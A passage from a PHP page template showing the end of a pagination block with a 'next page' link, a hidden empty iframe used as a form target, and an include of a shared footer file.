                                else
                                {
                                    ?>
                                    <li class="next_" onclick="pageMove(<?=$e_page+1?>)"><a></a></li>
                                    <?php
                                }
                            }
                        }
						?>
					</ul>
				</div>
			</div>
		</div>

	</div>
</div>
<iframe src="" style="display:none;" id="sendframe" name="sendframe"></iframe>
<style>

</style>


<?php require_once($_SERVER['DOCUMENT_ROOT']."/common/footer.php"); ?>